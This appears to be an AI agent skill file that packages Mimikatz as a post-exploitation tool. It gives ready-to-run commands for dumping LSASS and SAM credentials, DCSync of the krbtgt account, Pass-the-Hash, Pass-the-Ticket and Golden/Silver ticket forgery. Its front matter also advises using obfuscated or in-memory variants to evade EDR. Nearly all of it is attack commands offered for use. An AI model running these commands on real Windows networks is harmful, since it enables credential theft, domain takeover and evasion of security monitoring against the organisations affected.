---
name: mimikatz
description: "Mimikatz: Windows credential extraction tool for dumping LSASS, extracting plaintext passwords, NTLM hashes, Kerberos tickets, and performing Pass-the-Hash, Pass-the-Ticket, and Golden/Silver Ticket attacks. Use for post-exploitation credential harvesting on Windows or Kerberos-based pivoting."
license: CC-BY-4.0
compatibility: "Windows x86/x64. Requires SeDebugPrivilege. Modern EDR detects it — use obfuscated variants or in-memory execution."
metadata:
  author: AeonDave
  version: "1.0"
---

# Mimikatz

Windows credential extraction and Kerberos attacks.

## Quick Start

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
```

## Core Modules

| Module::Command | Purpose |
|----------------|---------|
| `privilege::debug` | Enable SeDebugPrivilege (required first) |
| `sekurlsa::logonpasswords` | Dump cached creds from LSASS |
| `sekurlsa::pth` | Pass-the-Hash — spawn process with NTLM |
| `sekurlsa::tickets` | List/dump Kerberos tickets |
| `kerberos::ptt <ticket.kirbi>` | Pass-the-Ticket — inject ticket |
| `lsadump::sam` | Dump SAM database hashes |
| `lsadump::dcsync /user:<u>` | DCSync — pull hashes from DC |
| `lsadump::lsa /patch` | Patch LSA and dump secrets |
| `kerberos::golden` | Create Golden Ticket |
| `kerberos::silver` | Create Silver Ticket |
| `crypto::certificates` | Dump certificates |

## Pass-the-Hash

```
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash> /run:cmd.exe
```

## DCSync (requires DA or replication rights)

```
lsadump::dcsync /domain:corp.local /user:krbtgt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Golden/Silver ticket syntax, DPAPI, token manipulation |
